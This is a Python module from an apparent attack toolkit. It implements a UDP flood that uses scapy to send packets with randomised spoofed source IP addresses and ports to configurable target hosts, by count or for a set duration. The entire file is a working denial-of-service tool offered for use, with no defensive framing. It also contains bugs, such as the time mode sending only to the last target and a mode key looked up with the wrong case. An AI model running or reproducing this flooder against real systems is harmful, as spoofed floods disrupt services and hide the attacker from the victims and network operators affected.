from scapy.all import *

from lib.EZData import *
from lib.cmd_tool import *
import lib.ColorPrint as cp

NAME = 'UdpFlood'

class Module:
    def __init__(self):
        self.config = {
            'IP': {
                'value': '',
                'help': '',
            },
            'Ports': {
                'value': '80',
                'help': 'Target ports.',
            },
            'Count': {
                'value': '100',
                'help': 'Send packet count.',
            },
            'Time': {
                'value': '10',
                'help': 'Stop sending packet after specified seconds.',
            },
            'Payload': {
                'value': 'hellohellohello',
                'help': 'Packet payload.',
            },
            'Mode': {
                'value': '0',
                'help': 'Run method.',
                'option': {
                    MODE_COUNT: 'Stop sending when total sent reach the maximum number.',
                    MODE_TIME: 'Stop sending after specified time(seconds).'
                }
            }
        }

        self.help = 'UDP flooding, send UDP packets with fake IP address.'

    def validate(self) -> bool:
        if not self.config['IP']['value'] or self.config['IP']['value'].replace(' ', '') == '':
            cp.pf_failed('\'IP\' is null or empty.')
            return False
        
        if not self.config['Ports']['value']:
            cp.pf_failed('\'Ports\' is null or empty.')
        
        return True

    def interactive(self):
        interactive(self, 'udp_flood')

    def run(self):
        def send_udp(ip: str, port: int):
            src_port = randInt()
            src_ip = randIP()

            pktIP = IP(src=src_ip, dst=ip)
            pktUDP = UDP(sport=src_port, dport=port)

            pkt = pktIP / pktUDP / payload
            send(pkt, verbose=False)

        try:
            total = 0
            cnt = int(get_value(self.config, 'Count'))
            mode = get_optionIdx(self.config, 'mode')
            nTime = int(get_value(self.config, 'Time'))
            payload = Raw(load=get_value(self.config, 'Payload'))

            lsIP = str2strls(self.config['IP']['value'])
            lsPorts = str2intls(self.config['Ports']['value'])

            lsHost = list()

            for ip in lsIP:
                for port in lsPorts:
                    lsHost.append((ip, port))

            if len(lsHost) > 1:
                cp.pf_warn(f'More then one target, this tool will send {cnt} packet{"" if cnt == 1 else "s"} for each target.')

            if mode == MODE_COUNT:
                for host in lsHost:
                    ip, port = host
                    for i in range(0, cnt):
                        send_udp(ip, port)                       
                        total += 1

            elif mode == MODE_TIME:
                total = doWorkWithSeconds(send_udp, nTime, {'ip': ip, 'port': port})

            cp.pf_ok(f'Sent packets: {total}')
        
        except Exception as ex:
            cp.pf_failed(str(ex))